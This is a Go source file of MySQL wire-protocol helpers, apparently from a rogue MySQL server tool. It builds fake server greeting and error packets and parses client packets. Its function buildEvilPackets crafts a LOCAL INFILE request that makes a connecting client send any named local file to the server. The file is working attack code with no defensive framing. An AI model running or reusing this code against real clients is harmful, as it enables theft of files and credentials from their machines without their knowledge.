package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"io"
	"math/rand"
	"net"
	"strings"
)

func writeBody(conn net.Conn, buf []byte) {
	_, _ = conn.Write(buf)
}

func parseHeader(headerBuf []byte) (uint32, uint8) {
	lengthBuf := headerBuf[:3]
	lengthBuf = append(lengthBuf, 0)
	length := binary.LittleEndian.Uint32(lengthBuf)
	packetNum := headerBuf[3]
	return length, packetNum
}

func readOnePacket(conn net.Conn) []byte {
	headerBuf := make([]byte, 4)
	n, err := io.LimitReader(conn, 4).Read(headerBuf)
	if n == 0 || err != nil {
		return []byte{}
	}
	length, _ := parseHeader(headerBuf)
	// packet number
	buf, _ := io.ReadAll(io.LimitReader(conn, int64(length)))
	return append(headerBuf, buf...)
}

func parsePackets(buf []byte) (int, [][]byte) {
	packetCont := 0
	pos := 0
	packets := make([][]byte, 0)
	length := len(buf)
	for pos < length {
		l, _ := parseHeader(buf[pos : pos+4])
		packetCont += 1
		end := pos + 4 + int(l)
		packets = append(packets, buf[pos:end])
		pos = end
		// check if this is a EOF packet
		//if p[4] == 0xfe {
		//	break
		//}
	}
	return packetCont, packets
}

func parseOS(buf []byte) string {
	return ""
}

func GetNativePwdHash(password string, salt []byte) []byte {
	t := sha1.Sum([]byte(password))
	hash1 := sha1.Sum(t[:])
	hash2 := sha1.Sum(append(salt, hash1[:]...))
	correctHash := make([]byte, 20)
	for j := range hash2 {
		correctHash[j] = t[j] ^ hash2[j]
	}
	return correctHash
}

func isQueryPacket(data []byte) bool {
	hasQueryFlag := data[4] == 0x03
	hasSelect := strings.ToUpper(string(data[5:11])) == "SELECT"
	return hasQueryFlag && hasSelect
}

func isQuitPacket(data []byte) bool {
	return bytes.Compare(data, []byte{0x1, 0x0, 0x0, 0x0, 0x1}) == 0
}

func buildEvilPackets(filename string) []byte {
	packet := make([]byte, 0)
	packet = append(packet, 0xfb) // flag
	packet = append(packet, []byte(filename)...)
	return addMysqlHeader(packet, 1)
}

func addMysqlHeader(data []byte, packerNumber int) []byte {
	buf := make([]byte, 0)
	t := make([]byte, 4)
	binary.LittleEndian.PutUint32(t, uint32(len(data)))
	buf = append(buf, t[:3]...)
	buf = append(buf, uint8(packerNumber))
	buf = append(buf, data...)
	return buf
}

func NewGreetingPacket(mysqlVersion, authPlugin string, salt []byte) []byte {
	packet := make([]byte, 0)
	// protocol
	packet = append(packet, uint8(10))
	var version [7]byte
	// version
	copy(version[:], mysqlVersion)
	packet = append(packet, version[:]...)
	// thread id - 06 00 00 00
	packet = binary.LittleEndian.AppendUint32(packet, uint32(rand.Intn(128)))
	//packet = append(packet, []byte{0x06, 0x0, 0x0, 0x0}...)
	// salt - first part
	t := make([]byte, 8)
	copy(t, salt[:8])
	packet = append(packet, append(t, 0x0)...)
	// server capabilities
	packet = append(packet, []byte{0xff, 0xff}...)
	// server language
	packet = append(packet, 0x08)
	// server status
	packet = append(packet, []byte{0x2, 0x0}...)
	// extended capabilities
	packet = append(packet, []byte{0xff, 0xc1}...)
	// auth plugin length
	packet = append(packet, uint8(len(authPlugin)))
	// unused
	packet = append(packet, []byte{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}...)
	// salt - second part
	packet = append(packet, append(salt[8:], 0)...)
	// auth plugin
	packet = append(packet, []byte(authPlugin+"\u0000")...)

	x := addMysqlHeader(packet, 0)
	return x
}

func NewErrorPacket(errorCode int, sqlState string, errMsg string, packetNumber int) []byte {
	packet := make([]byte, 0)
	packet = append(packet, uint8(0xff))
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, uint16(errorCode))
	packet = append(packet, buf...)
	packet = append(packet, 0x23)
	packet = append(packet, []byte(sqlState)...)
	packet = append(packet, []byte(errMsg)...)

	x := addMysqlHeader(packet, packetNumber)
	return x
}
